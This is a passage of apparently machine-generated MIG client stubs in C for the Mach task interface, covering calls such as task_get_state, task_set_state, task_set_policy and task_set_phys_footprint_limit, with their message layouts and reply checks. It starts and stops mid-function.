#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		boolean_t assign_threads;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_assign_default_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_assign_default_t__defined */

	__DeclareSendRpc(3430, "task_assign_default")

	InP->NDR = NDR_record;

	InP->assign_threads = assign_threads;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3430;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3430, "task_assign_default")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3430, "task_assign_default")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_assign_default_t__defined)
	check_result = __MIG_check__Reply__task_assign_default_t((__Reply__task_assign_default_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_assign_default_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_assignment_t__defined)
#define __MIG_check__Reply__task_get_assignment_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_assignment_t(__Reply__task_get_assignment_t *Out0P)
{

	typedef __Reply__task_get_assignment_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3531) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->assigned_set.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->assigned_set.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_assignment_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_assignment */
mig_external kern_return_t task_get_assignment
(
	task_inspect_t task,
	processor_set_name_t *assigned_set
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t assigned_set;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t assigned_set;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_assignment_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_assignment_t__defined */

	__DeclareSendRpc(3431, "task_get_assignment")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3431;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3431, "task_get_assignment")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3431, "task_get_assignment")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_assignment_t__defined)
	check_result = __MIG_check__Reply__task_get_assignment_t((__Reply__task_get_assignment_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_assignment_t__defined) */

	*assigned_set = Out0P->assigned_set.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_policy_t__defined)
#define __MIG_check__Reply__task_set_policy_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_policy_t(__Reply__task_set_policy_t *Out0P)
{

	typedef __Reply__task_set_policy_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3532) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_policy_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_policy */
mig_external kern_return_t task_set_policy
(
	task_t task,
	processor_set_t pset,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	policy_limit_t limit,
	mach_msg_type_number_t limitCnt,
	boolean_t change
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pset;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		mach_msg_type_number_t limitCnt;
		integer_t limit[1];
		boolean_t change;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__task_set_policy_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_policy_t__defined */

	__DeclareSendRpc(3432, "task_set_policy")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t psetTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->pset = psetTemplate;
	InP->pset.name = pset;
#else	/* UseStaticTemplates */
	InP->pset.name = pset;
	InP->pset.disposition = 19;
	InP->pset.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->policy = policy;

	if (baseCnt > 5) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->base, (const char *) base, 4 * baseCnt);

	InP->baseCnt = baseCnt;

	msgh_size_delta = (4 * baseCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 24) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 20);

	if (limitCnt > 1) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->limit, (const char *) limit, 4 * limitCnt);

	InP->limitCnt = limitCnt;

	msgh_size_delta = (4 * limitCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 4);

	InP->change = change;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3432;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3432, "task_set_policy")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3432, "task_set_policy")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_policy_t__defined)
	check_result = __MIG_check__Reply__task_set_policy_t((__Reply__task_set_policy_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_policy_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_state_t__defined)
#define __MIG_check__Reply__task_get_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_state_t(__Reply__task_get_state_t *Out0P)
{

	typedef __Reply__task_get_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3533) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 5184)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->old_stateCnt > 1296 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 5184)) / 4< Out0P->old_stateCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 5184) + Out0P->old_stateCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_state_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_state */
mig_external kern_return_t task_get_state
(
	task_read_t task,
	thread_state_flavor_t flavor,
	thread_state_t old_state,
	mach_msg_type_number_t *old_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t old_stateCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_state_t__defined */

	__DeclareSendRpc(3433, "task_get_state")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*old_stateCnt < 1296)
		InP->old_stateCnt = *old_stateCnt;
	else
		InP->old_stateCnt = 1296;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3433;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3433, "task_get_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3433, "task_get_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_state_t__defined)
	check_result = __MIG_check__Reply__task_get_state_t((__Reply__task_get_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_state_t__defined) */

	if (Out0P->old_stateCnt > *old_stateCnt) {
		(void)memcpy((char *) old_state, (const char *) Out0P->old_state, 4 *  *old_stateCnt);
		*old_stateCnt = Out0P->old_stateCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) old_state, (const char *) Out0P->old_state, 4 * Out0P->old_stateCnt);

	*old_stateCnt = Out0P->old_stateCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_state_t__defined)
#define __MIG_check__Reply__task_set_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_state_t(__Reply__task_set_state_t *Out0P)
{

	typedef __Reply__task_set_state_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3534) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_state_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_state */
mig_external kern_return_t task_set_state
(
	task_t task,
	thread_state_flavor_t flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__task_set_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_state_t__defined */

	__DeclareSendRpc(3434, "task_set_state")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (new_stateCnt > 1296) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->new_state, (const char *) new_state, 4 * new_stateCnt);

	InP->new_stateCnt = new_stateCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 5184) + ((4 * new_stateCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3434;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3434, "task_set_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3434, "task_set_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_state_t__defined)
	check_result = __MIG_check__Reply__task_set_state_t((__Reply__task_set_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_state_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_phys_footprint_limit_t__defined)
#define __MIG_check__Reply__task_set_phys_footprint_limit_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_phys_footprint_limit_t(__Reply__task_set_phys_footprint_limit_t *Out0P)
{

	typedef __Reply__task_set_phys_footprint_limit_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3535) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_set_phys_footprint_limit_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_phys_footprint_limit */
mig_external kern_return_t task_set_phys_footprint_limit
(
	task_t task,
	int new_limit,
	int *old_limit
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int new_limit;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		int old_limit;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		int old_limit;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_phys_footprint_limit_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_phys_footprint_limit_t__defined */

	__DeclareSendRpc(3435, "task_set_phys_footprint_limit")

	InP->NDR = NDR_record;

	InP->new_limit = new_limit;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3435;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3435, "task_set_phys_footprint_limit")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3435, "task_set_phys_footprint_limit")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_phys_footprint_limit_t__defined)
	check_result = __MIG_check__Reply__task_set_phys_footprint_limit_t((__Reply__task_set_phys_footprint_limit_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_phys_footprint_limit_t__defined) */

	*old_limit = Out0P->old_limit;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_suspend2_t__defined)
#define __MIG_check__Reply__task_suspend2_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_suspend2_t(__Reply__task_suspend2_t *Out0P)
{

	typedef __Reply__task_suspend2_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3536) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
